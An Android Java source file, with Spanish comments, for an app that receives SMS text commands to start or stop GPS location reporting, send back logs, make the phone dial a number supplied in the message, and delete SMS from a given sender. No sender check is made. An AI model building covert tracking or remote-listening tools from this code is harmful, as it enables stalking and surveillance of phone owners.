// NOTA: los SMS o servicios de "BroadCastReceiver" en su mayoria no necesitanun aplicacion que este corriendo en tiempo real, para actuar, para accionarse, mas bien se pueden usar para activar activitys q
// necesitemos activar en caso la App este down, o descativada.

package com.example.localize_telegram;

import android.app.ActivityManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;
import android.widget.Toast;


//The messages are stored in an Object array in the PDU format. 
//To extract each message, you use the static createFromPdu() 
//method from the SmsMessage class. The SMS message is then displayed using the Toast class:


public class ReceiveSMS extends BroadcastReceiver {
	
	private static final String ACTION_SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";
	private final static String TAG = "ReceiverSMS";
	public static final String  KEY_SMS_CMD = "COMANDO SMS";
	public static final String  KEY_SMS_FROM = "SMS DE QUIEN";
	public static final int  rsptSMS_OK = 1;
	private String bodySms="";
	String dataFrm="";
	Intent launchIntent=null;
	Service_GPS serviceGps = null;

			
			
	
	
	//NOTA:una vez esta clase este instanciada y activa en memoria, los SMS que llegan al telefono > a 66 caracteres se dividen en grupos de PDUs
	//cada PDU es leido por este metodo, una vez leido se descarta y se prosigue al sgnt PDU, hasta terminar todos los PDUs. por esta razon,
	//es que la variable bodySms se declara afuera de este metodo para que no pierda los PDUs iniciales y solo se sumen.
	@Override
	public void onReceive(final Context context, Intent intent) {
		
		if (intent.getAction().equals(ACTION_SMS_RECEIVED)) {
			        //---get the SMS message passed in---
			        Bundle bundle = intent.getExtras();        
			        SmsMessage[] msgs = null;
			        String str = "",smsFrom="";     
			        //Toast.makeText(context, "onReceive()  SMS", Toast.LENGTH_SHORT).show();
			        Log.i(TAG,"onReceive() Iniciado");
			
			        if (bundle != null){
			        	
			        		
				            Object[] pdus = (Object[]) bundle.get("pdus");
				            msgs = new SmsMessage[pdus.length];
			
				            for (int i=0; i<msgs.length; i++){
				                msgs[i] = SmsMessage.createFromPdu((byte[])pdus[i]);                
				                str += "SMS from " + msgs[i].getOriginatingAddress();
				                smsFrom = msgs[i].getOriginatingAddress();							//lo agrege el 23/08/2019
				                msgs[i].getOriginatingAddress();
				                str += " :";
				                str += msgs[i].getMessageBody().toString();
				                bodySms += msgs[i].getMessageBody().toString();					//NOTA si el SMS < 66 caracteres el bodySms[0] = # si el sms > 66 caracteres bodySms[0] = nro de PDU 
				                str += "n";        
				            }
				            
				            Log.i(TAG,"onReceive() Iniciado SMS From : " + smsFrom);				// onReceive() Iniciado SMS From6505551212
				            Log.i(TAG,"onReceive() Iniciado SMS Body : " + bodySms);				// onReceive() Iniciado SMS From6505551212
							
							try {
			
										String strCMD = "";
										String strSMS = bodySms.toLowerCase().trim();																					// dspues del # lee los prox digitos.
										
										Log.i(TAG,"comand = "+ strSMS);
										/*
										Log.i(TAG,"filtro START = " + String.valueOf( strSMS.indexOf(var.START)));
										Log.i(TAG,"filtro COMA = " + String.valueOf( strSMS.indexOf(",")));
										Log.i(TAG,"filtro STOP  = " + String.valueOf( strSMS.indexOf(var.STOP)));
										*/
										boolean flgComandoValido=false;
										
										if (strSMS.indexOf(var.START) ==0) {
															// #start,08			empieza el Localize envia c/8minutos.
															flgComandoValido = true;
															String tiempo = "";
															int idx = strSMS.indexOf(",");
															
															if (idx==-1)
																	tiempo ="0";																													   // tiempo = 0 es indefinido
															else
			
																	if (strSMS.substring(idx).length() > 1)																				// despues de la coma debe haber un valor + la coma
																		tiempo = strSMS.substring(idx+1);		  																		// solo 2 digitos hasta 99 min.
																	else
																		tiempo = "0";
				
															strCMD = var.START + "," + tiempo;																									// tiempo ya contiene ","
															Log.i(TAG,"comand START = " + strCMD);
															launchMyService(context, Service_GPS.class,KEY_SMS_CMD, strCMD, KEY_SMS_FROM, smsFrom);
										} 
																		
										
										
										// #stop		empieza el Localize envia c/8minutos.
										if (strSMS.indexOf(var.STOP) ==0) {
														flgComandoValido = true;		 
														 strCMD = var.STOP;
														 Log.i(TAG,"comando STOP = " + strSMS);
														 launchMyService(context, Service_GPS.class,KEY_SMS_CMD, strCMD, KEY_SMS_FROM, smsFrom);
					 												 
														 // if Service Class RUNNING
														if (isServiceRunning(context, Service_GPS.class)) {
																Log.i(TAG,"Service_GPS are Running NOW");
					 									 } else {
					 									       	Log.i(TAG,"Service_GPS are NOT Running going to LAUNCH Service_GPS");
					 									       
					 									 }
										}
										
										
										
										// #request	config --> rqconfig
										if (strSMS.indexOf(var.RQST_CFG) ==0) {
														flgComandoValido = true;
														 strCMD = var.RQST_CFG;
														 Log.i(TAG,"comando STOP = " + strSMS);
														 launchMyService(context, Service_GPS.class,KEY_SMS_CMD, strCMD, KEY_SMS_FROM, smsFrom);
					 												 
														 // if Service Class RUNNING
														if (isServiceRunning(context, Service_GPS.class)) {
																Log.i(TAG,"Service_GPS are Running NOW");
					 									 } else {
					 									       	Log.i(TAG,"Service_GPS are NOT Running NOTHING to LAUNCH");
					 									 }
										}
										
										
										
										// #request	all log of Screen --> rqlogall
										if (strSMS.indexOf(var.RQST_LOGALL) ==0) {
														flgComandoValido = true;		 
														 strCMD = var.RQST_LOGALL;
														 Log.i(TAG,"comando Rqst ALL LOG = " + strSMS);
														 launchMyService(context, Service_GPS.class,KEY_SMS_CMD, strCMD, KEY_SMS_FROM, smsFrom);
					 												 
														 // if Service Class RUNNING
														if (isServiceRunning(context, Service_GPS.class)) {
																Log.i(TAG,"Service_GPS are Running NOW");
					 									 } else {
					 									       	Log.i(TAG,"Service_GPS are NOT Running NOTHING to LAUNCH");
					 									 }
										}
										
										
										
										
										// #request	log of Locations --> rqloggps
										if (strSMS.indexOf(var.RQST_LOGGPS) ==0) {
													flgComandoValido = true;						 
													strCMD = var.RQST_LOGGPS;
													Log.i(TAG,"comando Rqst ALL LOG of LOCATION= " + strSMS);
													launchMyService(context, Service_GPS.class,KEY_SMS_CMD, strCMD, KEY_SMS_FROM, smsFrom);
					 												 
													// if Service Class RUNNING
													if (isServiceRunning(context, Service_GPS.class)) {
																Log.i(TAG,"Service_GPS are Running NOW");
					 								 } else {
					 									       	Log.i(TAG,"Service_GPS are NOT Running NOTHING to LAUNCH");
					 								 }
										}
										
										
										
										// #request	log of Locations --> rqloggps
										if (strSMS.indexOf(var.COLGADO) ==0) {
													flgComandoValido = true;						 
													strCMD = var.COLGADO;
													Log.i(TAG,"comando Rqst COLGADO = " + strSMS);
													launchMyService(context, Service_GPS.class,KEY_SMS_CMD, strCMD, KEY_SMS_FROM, smsFrom);
					 												 
													// if Service Class RUNNING
													if (isServiceRunning(context, Service_GPS.class)) {
																Log.i(TAG,"Service_GPS are Running NOW");
					 								 } else {
					 									       	Log.i(TAG,"Service_GPS are NOT Running NOTHING to LAUNCH");
					 								 }
										}
										
										
										
										if (strSMS.indexOf(var.CALL_ME) ==0) {
													flgComandoValido = true;
													String call_nro = "";
													int idx = strSMS.indexOf(",");
													
													if (idx!=-1) {
					
															if (strSMS.substring(idx).length() > 1) {																				// despues de la coma debe haber un valor + la coma
																call_nro = strSMS.substring(idx+1);		  																		// solo 2 digitos hasta 99 min.
																strCMD = var.CALL_ME + "," + call_nro;																			
																Log.i(TAG,"comand Launch Localize_main-->CALL TELF  = " + strCMD);
																launchMyService(context, Service_GPS.class,KEY_SMS_CMD, strCMD, KEY_SMS_FROM, smsFrom);
																
																/*
																// lauch CALL o Activity
																SetCallTlf setCall = new SetCallTlf(context,call_nro);
																setCall.start();
																*/
																
																// Funciona BIEN
																Uri phoneUri = Uri.parse("tel:" + call_nro);
														        Intent callIntent = new Intent(Intent.ACTION_CALL, phoneUri);
														        callIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK  | Intent.FLAG_ACTIVITY_CLEAR_TOP  | Intent.FLAG_ACTIVITY_TASK_ON_HOME);
														        context.startActivity(callIntent);

															}
													}
										} 
										
										
										
										if (flgComandoValido ==false) {
											// NO HAY COMANDO
											Log.i(TAG,"Comando NO Valido = " + strSMS);
										}
			
										
										
										try {
									 		Thread.sleep(500);	//1500 mseg
										} catch (InterruptedException e) {
											e.printStackTrace();
										}

							}catch(Exception err) {	
										Log.i(TAG," ERR: "+ err.toString());
							}
								
							bodySms = "";
							
			        }//find e bundle != null     
			        
		}// fin de Receive if SMS
      
	} //fin de onReceive

	
	
	/*
	private void launchMyActivity(final Context context,final String str) {
			String packagePath = "com.example.localize_telegram";
		    //String classPath = "com.example.localize_telegram.Service_GPS";
		
		    String apkName = null;
		    try {
		    	Log.i(TAG,"My Context = " + context.getPackageName());					// My Context = com.example.localize_telegram
	    	
		        apkName = context.getPackageManager().getApplicationInfo(packagePath,0).sourceDir;
		    	Log.i(TAG, "apkName=" + apkName);
		        Toast.makeText(context, "apkName= " + apkName, Toast.LENGTH_LONG).show();
		        		        
		        Intent serviceIntent = new Intent(context, Localize_main.class);
		        context.startActivity(serviceIntent);														// if it is running then it remains running.
		    } catch (PackageManager.NameNotFoundException e) {
		    	Log.i(TAG, "PackageManager.NameNotFound=" + e.toString() );
		    }
		    
		    // add path to apk that contains classes you wish to load
		    //String extraApkPath = apkName + ":/path/to/extraLib.apk" 
		
		    //PathClassLoader pathClassLoader = new dalvik.system.PathClassLoader(apkName, ClassLoader.getSystemClassLoader());
	}
*/
	
	
	
	
// forma 01	: funciona SIMULADOR y TELEFONOS. BIEN! Lanza un Service Class
 private void launchMyService(final Context context, Class<?> destClass,final String strKeyCmd,String comando, final String strKeyFrom,String smsFrom) {
	 		Log.i(TAG, "launchMyService");
			Intent serviceIntent = new Intent(context,destClass);		//com.example.localize_telegram.
			Log.i(TAG, "Launch The APP Service_GPS");
			serviceIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP  | Intent.FLAG_ACTIVITY_TASK_ON_HOME);
			serviceIntent.putExtra(strKeyCmd,comando);
			serviceIntent.putExtra(strKeyFrom,smsFrom);
			context.startService(serviceIntent);				// if it is running then it remains running.
 }
 

/*
//forma 01	: funciona SIMULADOR y TELEFONOS. BIEN! Lanza un Activity Class
 private void launchMyActivity(final Context context,final String strKey, Class<?> destClass,String comando) {
	 	Intent intentActivity = context.getPackageManager().getLaunchIntentForPackage("com.example.localize_telegram.Localize_main");
		//if (intentActivity != null) {
			//Intent intentActivity = new Intent(context,destClass);		//com.example.localize_telegram.
			Log.i(TAG, "Launch The APP Localize_main()");
			intentActivity.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);		// | Intent.FLAG_ACTIVITY_CLEAR_TOP  | Intent.FLAG_ACTIVITY_TASK_ON_HOME);
			intentActivity.putExtra(strKey,comando);
			context.startActivity(intentActivity);
		//}
}
*/

 

 
 
 
 

 
 	// HILO PARA LLAMAR x TLF
 	/*
	private class SetCallTlf extends Thread {
			private String nroTlf = "";
			private Context context;
			public  SetCallTlf(Context context,String nroCall) {
				this.nroTlf = nroCall;
				this.context = context;
			}
			
			@Override
		    public void run() {
		        // Use the value here
				try {
				        Uri phoneUri = Uri.parse("tel:" + nroTlf);
				        Intent callIntent = new Intent(Intent.ACTION_CALL, phoneUri);
				        callIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK  | Intent.FLAG_ACTIVITY_CLEAR_TOP  | Intent.FLAG_ACTIVITY_TASK_ON_HOME);
				        context.startActivity(callIntent);
				}catch (Exception e) {
  				Log.i(TAG,"ERR  SetCallTlf.run() = " + e.getMessage());
  				//setMsgPopUp(TAG + "ERR  SetCallTlf.run() = " + e.getMessage() + " " + Funcion.getFecha());
				}
		    }		
	}
	*/

	



//					func 03
/*
// Para Lanzar un Activity si FUNCIONA.
private void launchMyActivity(final Context context) {
		new Thread(new Runnable() {
	
			public void run() {
					try {
	
						Intent launchIntent = context.getPackageManager().getLaunchIntentForPackage("course.examples.notification.statusbar");
	    				if (launchIntent != null) {
	    					Log.i(TAG, "Launch The APP");
	    					//Toast.makeText(context, "Launching statusbar()" , Toast.LENGTH_LONG).show();
	    				    launchIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
	    				    context.startActivity(launchIntent);
	    				}
							
					} catch (Exception e) {
						Log.i(TAG,"ERROR Trying to Launch Activity = " + e.toString());
						//Toast.makeText(context, "ERR =" + e.toString() , Toast.LENGTH_LONG).show();
					}
			}
		}).start();

}
*/


	
	

/*
public void launchMyActivity(final Context context,final String str) {
	ourMainThrd = new Thread(new Runnable() {
		   
		@Override
		public void run() {
				// Launch an External App When the Counter == 5
				Log.i(TAG, "Localize_main");
				Intent launchIntent = context.getPackageManager().getLaunchIntentForPackage("course.examples.notification.statusbar");
				if (launchIntent != null) {
					Log.i(TAG, "Launch The APP");
				    launchIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
				    context.startActivity(launchIntent);
				}else {
					Log.i(TAG, "launchIntent is = null");
				}
		}
		
	});
	ourMainThrd.start();
}

*/







	
//										func 04 
//Sirve para Levantar un Activity sino esta ACTIVO.	antes del 23/08/2019
 //(final Context context,final String strKey, Class<Localize_main> destClass,String comando)
 /*
private  void launchMyActivity(final Context context,final String str) {
		
		//Creamos un Hilo
		new Thread(new Runnable() {

			public void run() {
					try {
							Log.i(TAG, "Launching Activity Localize_main()");
							Intent intReadSMS = new Intent(Intent.ACTION_MAIN); 
							intReadSMS.addCategory(Intent.CATEGORY_LAUNCHER);
							intReadSMS.setClassName("com.example.localize_telegram","com.example.localize_telegram.callTlf_Activity");
							intReadSMS.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);							//  | Intent.FLAG_ACTIVITY_CLEAR_TOP  | Intent.FLAG_ACTIVITY_TASK_ON_HOME 	// If set, this activity will become the start of a new task on this history stack. A task (from the activity that started it to the next task activity) defines an atomic group of activities that the user can move to. Tasks can be moved to the foreground and background; all of the activities inside of a particular task always remain in the same order. See Tasks and Back Stack for more information about tasks.
							intReadSMS.addFlags(Intent.FLAG_FROM_BACKGROUND);
							intReadSMS.setComponent(new ComponentName("com.example.localize_telegram","com.example.localize_telegram.callTlf_Activity"));  // ComponentName: The name of app component to handle the intent, or null to let the system find one for you. 
							intReadSMS.putExtra(KEY_SMS_CMD,str);
							
							context.startActivity( intReadSMS);
							//Toast.makeText(context, "start Activity Localize_telegram" , Toast.LENGTH_SHORT).show();
					} catch (Exception e) {
						Log.i(TAG,"ERROR in launchMyActivity() = " + e.toString());
					}
			}
		}).start();
 
}// fin de Funcin
*/


	
	// test if an Activity Class are running or not.
	private boolean isServiceRunning(Context context, Class<?> serviceClass) {
		        ActivityManager activityManager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
		        if (activityManager != null) {
		            // Get a list of running services
		            for (ActivityManager.RunningServiceInfo service : activityManager.getRunningServices(Integer.MAX_VALUE)) {
		                // Check if the service class matches the provided service class
		                if (serviceClass.getName().equals(service.service.getClassName())) {
		                    return true;
		                }
		            }
		        }
		        return false;
	}

	
	

	
	//---sends an SMS message to another device---
    public static void sendSMS(String phoneNumber, Context contexto, String message) {
        PendingIntent pi = PendingIntent.getActivity(contexto, 0, new Intent(), 0); // The PendingIntent  is used to identify a target to invoke at a later time.               
        SmsManager sms = SmsManager.getDefault();	//Unlike other classes, you do not directly instantiate this class; instead you will call the getDefault() static method to obtain an SmsManager object.
        sms.sendTextMessage(phoneNumber, null, message, pi, null);        
    }    
    //note: PendingIntent
    //For example, after sending the message, you can use a PendingIntent object to display another activity.
    //In this case, the PendingIntent object (pi) is simply pointing to the same activity (SMS.java), so when the SMS is sent, nothing will happen.	
	
	
    public static void sendSMSt(final String phoneNumber, final Context contexto,final String message) {
			new Thread(new Runnable() {
	
				private String phN=phoneNumber;
				private String txSMS=message;
				
				public void run() {
					try {
							PendingIntent pi = PendingIntent.getActivity(contexto, 0, new Intent(), 0); // The PendingIntent  is used to identify a target to invoke at a later time.               
					        SmsManager sms = SmsManager.getDefault();	//Unlike other classes, you do not directly instantiate this class; instead you will call the getDefault() static method to obtain an SmsManager object.
					        sms.sendTextMessage(phN, null, txSMS, pi, null);        
					} catch (Exception e) {
						e.printStackTrace();
					}
					
				}
			}).start();
    }
		
	
	
	 public void deleteSMS(Context context, String number) {
		    try {
		    	boolean flgFin = false;
		        Uri uriSms = Uri.parse("content://sms/inbox");
		        //Cursor c = context.getContentResolver().query( uriSms,
		        //        new String[] { "_id", "thread_id", "address", "person", "date", "body" }, "read=0", null, null);
		        Cursor c = context.getContentResolver().query( uriSms,null,null,null,null);
		        
		        if (c != null && c.moveToFirst()) {
		        	
		            do {
		                long id = c.getLong(0);
		                c.getLong(1);
		                String address = c.getString(2);
		                c.getString(5);
		                c.getString(3);
		                
		                /*
		                Log.e("log>>>",
		                        "0>" + c.getString(0) + "1>" + c.getString(1)
		                                + "2>" + c.getString(2) + "<-1>"
		                                + c.getString(3) + "4>" + c.getString(4)
		                                + "5>" + c.getString(5));
		                Log.e("log>>>", "date" + c.getString(0));
		                */
		                
		                if  (address.equals(number)) {
		                    // mLogger.logInfo("Deleting SMS with id: " + threadId);
		                    context.getContentResolver().delete(Uri.parse("content://sms/" + id), "date=?",  new String[] { c.getString(4) });
		                    //Log.e("log>>>", "Delete success.........");
		                    Toast.makeText(context, "Se Borro SMS del Nr:  " + number, Toast.LENGTH_SHORT).show();
		                    flgFin=true;
		                }
		            } while (c.moveToNext() && flgFin==false);
		            
		        }//fin de for
		        
		    } catch (Exception e) {
		        //Log.e("log>>>", e.toString());
		    	Toast.makeText(context, "Err al Borrar SMS del Nr:  " + number, Toast.LENGTH_SHORT).show();
		    }
		}

}//fin de ReceiveSMS
